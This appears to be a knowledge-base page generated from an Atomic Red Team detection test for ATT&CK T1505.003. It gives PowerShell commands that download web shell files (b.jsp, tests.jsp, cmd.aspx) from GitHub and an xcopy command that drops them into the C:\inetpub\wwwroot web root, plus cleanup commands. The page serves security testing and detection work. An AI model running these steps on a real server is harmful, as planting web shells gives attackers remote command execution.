---
atomic_guid: "0a2ce662-1efa-496f-a472-2fe7b080db16"
title: "Web Shell Written to Disk"
framework: "atomic"
generated: "true"
attack_technique_id: "T1505.003"
attack_technique_name: "Server Software Component: Web Shell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "0a2ce662-1efa-496f-a472-2fe7b080db16"
  - "Web Shell Written to Disk"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.
Idea from APTSimulator.
cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx

## ATT&CK Mapping

- [[kb/attack/techniques/T1505-server_software_component#^t1505003-web-shell|T1505.003: Web Shell]]

## Input Arguments

### web_shell_path

- description: The path to drop the web shell
- type: string
- default: C:\inetpub\wwwroot

### web_shells

- description: Path of Web Shell
- type: path
- default: PathToAtomicsFolder\T1505.003\src

## Dependencies

Web shell must exist on disk at specified location (#{web_shells})

### Prerequisite Check

```powershell
if (Test-Path "#{web_shells}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "#{web_shells}" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
```

## Executor

- name: command_prompt

### Command

```cmd
xcopy /I /Y "#{web_shells}" #{web_shell_path}
```

### Cleanup

```cmd
del #{web_shell_path}\b.jsp /q >nul 2>&1
del #{web_shell_path}\tests.jsp /q >nul 2>&1
del #{web_shell_path}\cmd.aspx /q >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.yaml)
